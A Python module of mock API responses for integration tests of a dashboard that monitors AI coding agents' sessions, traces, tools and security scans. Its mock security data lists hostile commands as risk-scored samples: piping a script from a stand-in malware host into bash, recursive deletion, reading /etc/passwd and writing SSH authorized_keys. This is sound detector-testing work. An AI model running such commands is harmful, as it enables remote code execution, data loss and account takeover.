"""
Mock API responses for integration tests.

Provides factory functions and pre-built responses that mimic
the real Analytics API responses for dashboard testing.
"""

from datetime import datetime, timedelta
from typing import Any


def create_session_data(
    session_id: str = "sess-001",
    title: str = "Test Session",
    created_at: datetime | None = None,
    tokens_in: int = 1000,
    tokens_out: int = 500,
) -> dict[str, Any]:
    """Create a mock session data dict.

    Args:
        session_id: Unique session identifier
        title: Session title/description
        created_at: Session creation timestamp
        tokens_in: Input tokens count
        tokens_out: Output tokens count

    Returns:
        Session data dict matching API response format
    """
    if created_at is None:
        created_at = datetime.now()

    return {
        "id": session_id,
        "title": title,
        "created_at": created_at.isoformat(),
        "tokens_in": tokens_in,
        "tokens_out": tokens_out,
        "directory": "/home/user/project",
    }


def create_trace_data(
    trace_id: str = "trace-001",
    session_id: str = "sess-001",
    parent_trace_id: str = "root_sess-001",
    subagent_type: str = "executor",
    status: str = "completed",
    duration_ms: int = 5000,
    tokens_in: int = 500,
    tokens_out: int = 250,
    started_at: datetime | None = None,
) -> dict[str, Any]:
    """Create a mock trace data dict.

    Args:
        trace_id: Unique trace identifier
        session_id: Parent session ID
        parent_trace_id: Parent trace (root_xxx for root sessions)
        subagent_type: Type of agent (user, executor, tester, etc.)
        status: Trace status (running, completed, error)
        duration_ms: Trace duration in milliseconds
        tokens_in: Input tokens
        tokens_out: Output tokens
        started_at: Trace start timestamp

    Returns:
        Trace data dict matching API response format
    """
    if started_at is None:
        started_at = datetime.now()

    return {
        "trace_id": trace_id,
        "session_id": session_id,
        "parent_trace_id": parent_trace_id,
        "subagent_type": subagent_type,
        "status": status,
        "duration_ms": duration_ms,
        "tokens_in": tokens_in,
        "tokens_out": tokens_out,
        "started_at": started_at.isoformat(),
        "parent_agent": "user" if subagent_type == "user" else "coordinator",
    }


def create_global_stats(
    total_sessions: int = 10,
    total_traces: int = 50,
    total_messages: int = 200,
    total_tokens: int = 50000,
    unique_agents: int = 5,
) -> dict[str, Any]:
    """Create mock global statistics.

    Args:
        total_sessions: Number of sessions
        total_traces: Number of traces
        total_messages: Number of messages
        total_tokens: Total tokens used
        unique_agents: Number of unique agents

    Returns:
        Global stats dict matching API response format
    """
    input_tokens = int(total_tokens * 0.6)
    output_tokens = int(total_tokens * 0.3)
    cache_tokens = int(total_tokens * 0.1)

    return {
        "summary": {
            "total_sessions": total_sessions,
            "total_traces": total_traces,
            "total_messages": total_messages,
            "total_tokens": total_tokens,
            "unique_agents": unique_agents,
            "total_duration_ms": total_traces * 5000,
        },
        "details": {
            "tokens": {
                "input": input_tokens,
                "output": output_tokens,
                "cache_read": cache_tokens,
            }
        },
    }


def create_monitoring_data(
    num_agents: int = 2,
    num_busy: int = 1,
    num_waiting: int = 0,
) -> dict[str, Any]:
    """Create mock monitoring data.

    Args:
        num_agents: Total number of agents
        num_busy: Number of busy agents
        num_waiting: Number of agents waiting for user

    Returns:
        Monitoring data dict for UI update
    """
    agents_data = []
    for i in range(num_agents):
        is_busy = i < num_busy
        agents_data.append(
            {
                "agent_id": f"agent-{i:03d}",
                "title": f"Agent {i}",
                "dir": f"project-{i}",
                "status": "busy" if is_busy else "idle",
                "tools": [],
                "todos_total": 3 if is_busy else 0,
            }
        )

    waiting_data = []
    for i in range(num_waiting):
        waiting_data.append(
            {
                "agent_id": f"agent-waiting-{i:03d}",
                "title": f"Waiting Agent {i}",
                "question": "Please confirm action",
                "options": "Yes | No",
                "context": "test @ main",
            }
        )

    return {
        "instances": max(1, num_agents // 2),
        "agents": num_agents,
        "busy": num_busy,
        "waiting": num_waiting,
        "idle": max(0, (num_agents // 2) - num_busy),
        "todos": sum(a.get("todos_total", 0) for a in agents_data),
        "agents_data": agents_data,
        "tools_data": [],
        "waiting_data": waiting_data,
    }


def create_security_data(
    total_commands: int = 10,
    critical_count: int = 1,
    high_count: int = 2,
) -> dict[str, Any]:
    """Create mock security data.

    Args:
        total_commands: Total commands scanned
        critical_count: Number of critical commands
        high_count: Number of high risk commands

    Returns:
        Security data dict for UI update
    """
    commands = []
    for i in range(total_commands):
        if i < critical_count:
            risk = "critical"
            score = 90
        elif i < critical_count + high_count:
            risk = "high"
            score = 70
        else:
            risk = "low"
            score = 20

        commands.append(
            {
                "command": f"command-{i}",
                "risk": risk,
                "score": score,
                "reason": f"Test reason {i}",
            }
        )

    return {
        "stats": {
            "total_scanned": total_commands,
            "total_commands": total_commands,
            "critical": critical_count,
            "high": high_count,
            "medium": 0,
            "low": total_commands - critical_count - high_count,
        },
        "commands": commands,
        "files": [],
        "critical_items": [c for c in commands if c["risk"] in ("critical", "high")],
    }


class MockAPIResponses:
    """Pre-built API responses for common test scenarios."""

    @staticmethod
    def empty() -> dict[str, Any]:
        """Empty responses for testing initial state."""
        return {
            "health": True,
            "stats": {"sessions": 0, "traces": 0, "messages": 0},
            "global_stats": create_global_stats(0, 0, 0, 0, 0),
            "sessions": [],
            "traces": [],
            "delegations": [],
        }

    @staticmethod
    def api_error() -> dict[str, Any]:
        """Responses simulating API errors/unavailable.

        Use None to indicate errors (vs [] for empty but successful).
        """
        return {
            "health": False,
            "stats": None,
            "global_stats": None,
            "sessions": None,  # None = error, [] = empty
            "traces": None,
            "delegations": None,
        }

    @staticmethod
    def partial_data() -> dict[str, Any]:
        """Responses with missing/null fields (edge case testing).

        Tests dashboard resilience when API returns incomplete data.
        """
        now = datetime.now()
        return {
            "health": True,
            "stats": {"sessions": 5},  # Missing traces, messages
            "global_stats": None,  # Missing entirely
            "sessions": [
                {
                    "id": "sess-partial-001",
                    "title": None,  # Missing title
                    "created_at": now.isoformat(),
                    "tokens_in": None,  # Missing tokens
                    "tokens_out": 0,
                    "directory": None,
                }
            ],
            "traces": [],
            "delegations": [],
        }

    @staticmethod
    def extreme_data() -> dict[str, Any]:
        """Responses with extreme values (stress test).

        Tests dashboard handling of very large numbers and long strings.
        """
        now = datetime.now()

        # Create session with extreme values
        session = create_session_data(
            "sess-extreme",
            "A" * 500,  # Very long title (500 chars)
            now,
            tokens_in=999_999_999,  # Very large number
            tokens_out=999_999_999,
        )

        # Create 100 traces for stress testing
        traces = [
            create_trace_data(
                f"trace-extreme-{i:03d}",
                "sess-extreme",
                "root_sess-extreme",
                ["executor", "tester", "quality", "coordinator"][i % 4],
                "completed",
                duration_ms=i * 1000,
                tokens_in=100_000,
                tokens_out=50_000,
                started_at=now - timedelta(minutes=i),
            )
            for i in range(100)
        ]

        return {
            "health": True,
            "stats": {"sessions": 999_999, "traces": 999_999, "messages": 999_999_999},
            "global_stats": create_global_stats(
                999_999,  # sessions
                999_999,  # traces
                999_999_999,  # messages
                999_999_999_999,  # tokens
                100,  # unique agents
            ),
            "sessions": [session],
            "traces": traces,
            "delegations": [],
        }

    @staticmethod
    def realistic_monitoring() -> dict[str, Any]:
        """Create realistic monitoring data with agents, tools, and waiting items."""
        return {
            "instances": 2,
            "agents": 3,
            "busy": 2,
            "waiting": 1,
            "idle": 1,
            "todos": 7,
            "agents_data": [
                {
                    "agent_id": "agent-abc123",
                    "title": "Implement User Auth",
                    "dir": "/home/dev/auth-service",
                    "status": "busy",
                    "tools": [{"name": "edit"}, {"name": "bash"}],
                    "todos_total": 4,
                },
                {
                    "agent_id": "agent-def456",
                    "title": "Fix Database Migration",
                    "dir": "/home/dev/db-service",
                    "status": "busy",
                    "tools": [{"name": "read"}],
                    "todos_total": 3,
                },
                {
                    "agent_id": "agent-ghi789",
                    "title": "Code Review",
                    "dir": "/home/dev/frontend",
                    "status": "idle",
                    "tools": [],
                    "todos_total": 0,
                },
            ],
            "tools_data": [
                {
                    "name": "edit",
                    "agent": "Implement User Auth",
                    "arg": "src/auth/login.py",
                    "elapsed_ms": 1250,
                },
                {
                    "name": "bash",
                    "agent": "Implement User Auth",
                    "arg": "pytest tests/",
                    "elapsed_ms": 5400,
                },
                {
                    "name": "read",
                    "agent": "Fix Database Migration",
                    "arg": "migrations/v2.sql",
                    "elapsed_ms": 150,
                },
            ],
            "waiting_data": [
                {
                    "agent_id": "agent-wait001",
                    "title": "Deploy to Production",
                    "question": "Are you sure you want to deploy version 2.5.0 to production? This will affect 10,000 users.",
                    "options": "Yes, deploy | No, cancel | Schedule for later",
                    "context": "infra-team @ main",
                },
            ],
        }

    @staticmethod
    def realistic_monitoring_all_idle() -> dict[str, Any]:
        """All agents idle, no tools running.

        Tests monitoring section displays correctly when nothing is active.
        """
        return {
            "instances": 2,
            "agents": 4,
            "busy": 0,
            "waiting": 0,
            "idle": 4,
            "todos": 0,
            "agents_data": [
                {
                    "agent_id": f"agent-idle-{i:03d}",
                    "title": f"Idle Agent {i}",
                    "dir": f"/home/dev/project-{i}",
                    "status": "idle",
                    "tools": [],
                    "todos_total": 0,
                }
                for i in range(4)
            ],
            "tools_data": [],
            "waiting_data": [],
        }

    @staticmethod
    def realistic_monitoring_all_waiting() -> dict[str, Any]:
        """Multiple agents waiting for user response.

        Tests monitoring section handles multiple waiting agents.
        """
        return {
            "instances": 3,
            "agents": 3,
            "busy": 0,
            "waiting": 3,
            "idle": 0,
            "todos": 0,
            "agents_data": [
                {
                    "agent_id": f"agent-wait-{i:03d}",
                    "title": f"Waiting Agent {i}",
                    "dir": f"/home/dev/project-{i}",
                    "status": "waiting",
                    "tools": [],
                    "todos_total": 0,
                }
                for i in range(3)
            ],
            "tools_data": [],
            "waiting_data": [
                {
                    "agent_id": f"agent-wait-{i:03d}",
                    "title": f"Waiting Agent {i}",
                    "question": f"Question {i}: Need user confirmation for action {i}",
                    "options": "Confirm | Reject | Skip",
                    "context": f"project-{i} @ feature-branch",
                }
                for i in range(3)
            ],
        }

    @staticmethod
    def realistic_monitoring_error() -> dict[str, Any]:
        """Monitoring data with some agents in error state.

        Tests monitoring section handles error states gracefully.
        """
        return {
            "instances": 2,
            "agents": 4,
            "busy": 1,
            "waiting": 0,
            "idle": 1,
            "todos": 2,
            "agents_data": [
                {
                    "agent_id": "agent-busy-001",
                    "title": "Normal Working Agent",
                    "dir": "/home/dev/project",
                    "status": "busy",
                    "tools": [{"name": "read"}],
                    "todos_total": 2,
                },
                {
                    "agent_id": "agent-error-001",
                    "title": "Error: Connection Failed",
                    "dir": "/home/dev/broken",
                    "status": "error",
                    "tools": [],
                    "todos_total": 0,
                },
                {
                    "agent_id": "agent-error-002",
                    "title": None,  # Missing title
                    "dir": None,  # Missing directory
                    "status": "unknown",
                    "tools": None,  # Missing tools
                    "todos_total": None,
                },
                {
                    "agent_id": "agent-idle-001",
                    "title": "Idle Agent",
                    "dir": "/home/dev/idle",
                    "status": "idle",
                    "tools": [],
                    "todos_total": 0,
                },
            ],
            "tools_data": [
                {
                    "name": "read",
                    "agent": "Normal Working Agent",
                    "arg": "src/file.py",
                    "elapsed_ms": 500,
                },
            ],
            "waiting_data": [],
        }

    @staticmethod
    def realistic_analytics() -> dict[str, Any]:
        """Create realistic analytics data with agents, tools, and skills."""
        return {
            "sessions": 42,
            "messages": 1337,
            "tokens": "2.5M",
            "cache_hit": "73%",
            "agents": [
                {"agent": "coordinator", "messages": 500, "tokens": 1200000},
                {"agent": "executor", "messages": 400, "tokens": 800000},
                {"agent": "tester", "messages": 250, "tokens": 400000},
                {"agent": "quality", "messages": 187, "tokens": 100000},
            ],
            "tools": [
                {"tool_name": "read", "invocations": 450, "failures": 5},
                {"tool_name": "edit", "invocations": 320, "failures": 12},
                {"tool_name": "bash", "invocations": 180, "failures": 8},
                {"tool_name": "grep", "invocations": 95, "failures": 0},
            ],
            "skills": [
                {"skill_name": "agentic-flow", "load_count": 15},
                {"skill_name": "swarm-orchestration", "load_count": 8},
                {"skill_name": "reporting-executor", "load_count": 12},
            ],
        }

    @staticmethod
    def realistic_security() -> dict[str, Any]:
        """Create realistic security data with commands and risk levels."""
        return {
            "stats": {
                "total_scanned": 156,
                "total_commands": 89,
                "critical": 2,
                "high": 7,
                "medium": 15,
                "low": 65,
            },
            "commands": [
                {
                    "command": "rm -rf /tmp/cache/*",
                    "risk": "critical",
                    "score": 95,
                    "reason": "Recursive deletion with wildcard",
                },
                {
                    "command": "curl https://malware.example.com/script.sh | bash",
                    "risk": "critical",
                    "score": 98,
                    "reason": "Remote code execution",
                },
                {
                    "command": "chmod 777 /var/www",
                    "risk": "high",
                    "score": 75,
                    "reason": "Overly permissive permissions",
                },
                {
                    "command": "git push --force origin main",
                    "risk": "high",
                    "score": 70,
                    "reason": "Force push to main branch",
                },
                {
                    "command": "pip install requests",
                    "risk": "low",
                    "score": 10,
                    "reason": "Package installation",
                },
            ],
            "files": [
                {
                    "operation": "READ",
                    "path": "/etc/passwd",
                    "risk": "high",
                    "score": 80,
                    "reason": "Sensitive system file",
                },
                {
                    "operation": "WRITE",
                    "path": "~/.ssh/authorized_keys",
                    "risk": "critical",
                    "score": 95,
                    "reason": "SSH key modification",
                },
            ],
            "critical_items": [
                {
                    "type": "COMMAND",
                    "details": "rm -rf /tmp/cache/*",
                    "risk": "critical",
                    "reason": "Recursive deletion",
                    "score": 95,
                },
                {
                    "type": "COMMAND",
                    "details": "curl ... | bash",
                    "risk": "critical",
                    "reason": "Remote code execution",
                    "score": 98,
                },
            ],
        }

    @staticmethod
    def realistic_tracing() -> dict[str, Any]:
        """Create realistic tracing data with session hierarchy."""
        now = datetime.now()

        # Create session hierarchy for TracingSection
        session_hierarchy = [
            {
                "session_id": "sess-root-001",
                "node_type": "session",
                "title": "Implement feature X",
                "directory": "/home/dev/my-project",
                "created_at": now.isoformat(),
                "status": "completed",
                "duration_ms": 125000,
                "tokens_in": 5000,
                "tokens_out": 8000,
                "trace_count": 5,
                "agent_type": None,
                "parent_agent": None,
                "children": [
                    {
                        "session_id": "sess-child-001",
                        "node_type": "agent",
                        "title": "Execute implementation",
                        "agent_type": "executor",
                        "parent_agent": "user",
                        "created_at": (now - timedelta(minutes=5)).isoformat(),
                        "status": "completed",
                        "duration_ms": 45000,
                        "tokens_in": 2000,
                        "tokens_out": 3000,
                        "trace_count": 2,
                        "children": [],
                    },
                    {
                        "session_id": "sess-child-002",
                        "node_type": "agent",
                        "title": "Run tests",
                        "agent_type": "tester",
                        "parent_agent": "executor",
                        "created_at": (now - timedelta(minutes=3)).isoformat(),
                        "status": "completed",
                        "duration_ms": 30000,
                        "tokens_in": 1500,
                        "tokens_out": 2500,
                        "trace_count": 1,
                        "children": [],
                    },
                ],
            },
        ]

        # Create traces list
        traces = [
            {
                "trace_id": "trace-001",
                "session_id": "sess-root-001",
                "parent_trace_id": "root_sess-root-001",
                "subagent_type": "user",
                "status": "completed",
                "duration_ms": 125000,
                "tokens_in": 5000,
                "tokens_out": 8000,
                "started_at": now.isoformat(),
            },
            {
                "trace_id": "trace-002",
                "session_id": "sess-child-001",
                "parent_trace_id": "trace-001",
                "subagent_type": "executor",
                "status": "completed",
                "duration_ms": 45000,
                "tokens_in": 2000,
                "tokens_out": 3000,
                "started_at": (now - timedelta(minutes=5)).isoformat(),
            },
            {
                "trace_id": "trace-003",
                "session_id": "sess-child-002",
                "parent_trace_id": "trace-002",
                "subagent_type": "tester",
                "status": "completed",
                "duration_ms": 30000,
                "tokens_in": 1500,
                "tokens_out": 2500,
                "started_at": (now - timedelta(minutes=3)).isoformat(),
            },
        ]

        # Create sessions list
        sessions = [
            {
                "id": "sess-root-001",
                "title": "Implement feature X",
                "directory": "/home/dev/my-project",
                "created_at": now.isoformat(),
                "tokens_in": 5000,
                "tokens_out": 8000,
            },
            {
                "id": "sess-child-001",
                "title": "Execute implementation",
                "directory": "/home/dev/my-project",
                "created_at": (now - timedelta(minutes=5)).isoformat(),
                "tokens_in": 2000,
                "tokens_out": 3000,
            },
            {
                "id": "sess-child-002",
                "title": "Run tests",
                "directory": "/home/dev/my-project",
                "created_at": (now - timedelta(minutes=3)).isoformat(),
                "tokens_in": 1500,
                "tokens_out": 2500,
            },
        ]

        return {
            "traces": traces,
            "sessions": sessions,
            "session_hierarchy": session_hierarchy,
            "total_traces": 3,
            "unique_agents": 3,
            "total_duration_ms": 200000,
            # Session detail data for MockAnalyticsAPIClient methods
            "session_tokens": {
                "sess-root-001": {
                    "input": 5000,
                    "output": 8000,
                    "cache_read": 1000,
                    "cache_write": 500,
                },
                "sess-child-001": {
                    "input": 2000,
                    "output": 3000,
                    "cache_read": 400,
                    "cache_write": 200,
                },
                "sess-child-002": {
                    "input": 1500,
                    "output": 2500,
                    "cache_read": 300,
                    "cache_write": 150,
                },
            },
            "session_tools": {
                "sess-root-001": [
                    {"tool_name": "read", "count": 15, "duration_ms": 500},
                    {"tool_name": "edit", "count": 8, "duration_ms": 1200},
                    {"tool_name": "bash", "count": 5, "duration_ms": 3000},
                ],
                "sess-child-001": [
                    {"tool_name": "read", "count": 10, "duration_ms": 300},
                    {"tool_name": "edit", "count": 5, "duration_ms": 800},
                ],
                "sess-child-002": [
                    {"tool_name": "bash", "count": 3, "duration_ms": 2000},
                ],
            },
            "session_files": {
                "sess-root-001": [
                    {"path": "src/main.py", "reads": 10, "writes": 3},
                    {"path": "tests/test_main.py", "reads": 5, "writes": 2},
                ],
                "sess-child-001": [
                    {"path": "src/auth/login.py", "reads": 8, "writes": 4},
                ],
                "sess-child-002": [
                    {"path": "tests/test_auth.py", "reads": 3, "writes": 1},
                ],
            },
            "session_agents": {
                "sess-root-001": [
                    {"agent": "executor", "messages": 50, "tokens": 5000},
                    {"agent": "tester", "messages": 30, "tokens": 3000},
                ],
                "sess-child-001": [
                    {"agent": "executor", "messages": 25, "tokens": 2500},
                ],
                "sess-child-002": [
                    {"agent": "tester", "messages": 15, "tokens": 1500},
                ],
            },
            "session_timeline": {
                "sess-root-001": [
                    {"timestamp": now.isoformat(), "event": "session_start"},
                    {
                        "timestamp": (now + timedelta(seconds=10)).isoformat(),
                        "event": "agent_spawn",
                        "agent": "executor",
                    },
                    {
                        "timestamp": (now + timedelta(minutes=2)).isoformat(),
                        "event": "agent_spawn",
                        "agent": "tester",
                    },
                    {
                        "timestamp": (now + timedelta(minutes=5)).isoformat(),
                        "event": "session_end",
                    },
                ],
                "sess-child-001": [
                    {
                        "timestamp": (now - timedelta(minutes=5)).isoformat(),
                        "event": "session_start",
                    },
                    {
                        "timestamp": (now - timedelta(minutes=4)).isoformat(),
                        "event": "session_end",
                    },
                ],
                "sess-child-002": [
                    {
                        "timestamp": (now - timedelta(minutes=3)).isoformat(),
                        "event": "session_start",
                    },
                    {
                        "timestamp": (now - timedelta(minutes=2)).isoformat(),
                        "event": "session_end",
                    },
                ],
            },
        }

    @staticmethod
    def basic() -> dict[str, Any]:
        """Basic responses with minimal data for simple tests."""
        now = datetime.now()
        session = create_session_data("sess-001", "Test Session", now)
        trace = create_trace_data(
            "trace-001", "sess-001", "root_sess-001", "user", started_at=now
        )

        return {
            "health": True,
            "stats": {"sessions": 1, "traces": 1, "messages": 10},
            "global_stats": create_global_stats(1, 1, 10, 1000, 1),
            "sessions": [session],
            "traces": [trace],
            "delegations": [],
            "session_messages": {
                "sess-001": [
                    {
                        "type": "text",
                        "role": "user",
                        "content": "Hello, test prompt",
                        "timestamp": now.isoformat(),
                        "tokens_in": 10,
                    },
                    {
                        "type": "text",
                        "role": "assistant",
                        "content": "Test response",
                        "timestamp": (now + timedelta(seconds=1)).isoformat(),
                        "tokens_out": 20,
                    },
                ]
            },
            "session_operations": {"sess-001": []},
        }

    @staticmethod
    def complex() -> dict[str, Any]:
        """Complex responses with multiple sessions and agents."""
        now = datetime.now()

        sessions = [
            create_session_data(
                f"sess-{i:03d}", f"Session {i}", now - timedelta(hours=i)
            )
            for i in range(3)
        ]

        traces = []
        # Root session with user trace
        traces.append(
            create_trace_data(
                "trace-001", "sess-000", "root_sess-000", "user", started_at=now
            )
        )
        # Sub-agents
        for i, agent_type in enumerate(["executor", "tester", "quality"]):
            traces.append(
                create_trace_data(
                    f"trace-{i + 2:03d}",
                    f"sess-{i + 1:03d}",
                    "root_sess-000",
                    agent_type,
                    started_at=now - timedelta(minutes=i * 5),
                )
            )

        return {
            "health": True,
            "stats": {"sessions": 3, "traces": 4, "messages": 100},
            "global_stats": create_global_stats(3, 4, 100, 25000, 4),
            "sessions": sessions,
            "traces": traces,
            "delegations": [
                {"parent_session_id": "sess-000", "child_session_id": "sess-001"},
                {"parent_session_id": "sess-000", "child_session_id": "sess-002"},
            ],
            "session_messages": {
                "sess-000": [
                    {
                        "type": "text",
                        "role": "user",
                        "content": "Complex task prompt",
                        "timestamp": now.isoformat(),
                        "tokens_in": 100,
                    },
                    {
                        "type": "text",
                        "role": "assistant",
                        "content": "Starting complex task...",
                        "timestamp": (now + timedelta(seconds=5)).isoformat(),
                        "tokens_out": 200,
                        "agent": "coordinator",
                    },
                ]
            },
            "session_operations": {
                "sess-001": [
                    {
                        "tool_name": "read",
                        "display_info": "src/main.py",
                        "status": "completed",
                        "timestamp": now.isoformat(),
                        "duration_ms": 50,
                    },
                    {
                        "tool_name": "edit",
                        "display_info": "src/main.py",
                        "status": "completed",
                        "timestamp": (now + timedelta(seconds=1)).isoformat(),
                        "duration_ms": 100,
                    },
                ]
            },
        }
